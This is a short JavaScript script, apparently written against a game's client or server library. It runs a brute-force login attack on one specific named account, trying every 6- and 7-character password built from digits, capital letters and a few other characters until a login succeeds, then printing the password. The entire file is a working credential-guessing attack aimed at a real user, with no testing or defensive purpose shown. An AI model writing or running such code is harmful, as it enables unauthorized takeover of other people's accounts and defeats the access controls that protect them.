
require("../server/FileManager");
require("../server/Mutex");
require("../server/StateManager");
require("../server/TaskManager");
require("../server/yzdzz/GameController");

$FileManager.RootDirectory = __dirname + "/..";

var targetAccount = "y648819446";
var passwordChs = [];

var ranges = [
    ['0', '9'],
    ['A', 'Z'],
    ['z', 'z'],
];
var chars = ['_'];
for (var i = 0; i < ranges.length; ++i) {
    var range = ranges[i];
    var startCode = range[0].charCodeAt(0);
    var endCode = range[1].charCodeAt(0);
    for (var j = startCode; j <= endCode; ++j) {
        var ch = String.fromCharCode(j);
        chars.push(ch);
    }
}

var lengthRange = [6, 7];

var next = coroutine(function*() {
    var gameController = new GameController();
    var accountManager = gameController.getAccountManager();
    var appendPassword = (base, l, done) => {
        var tnext = coroutine(function*() {
            if (base.length == l) {
                console.log("try password", base);
                var key = accountManager.add(targetAccount, base);
                var conn = accountManager.connectAccount(key);
                var data = yield conn.loginAccount(tnext);
                if (data.success) {
                    console.log("password:", base);
                    throw "Found!";
                    return;
                }
                accountManager.remove(key);
            } else {
                for (var i = 0; i < chars.length; ++i) {
                    yield appendPassword(base + chars[i], l, tnext);
                }
            }
            safe(done)();
        }, null);
    };
    for (var l = lengthRange[0]; l <= lengthRange[1]; ++l) {
        yield appendPassword("", l, next);
    }
}, null);
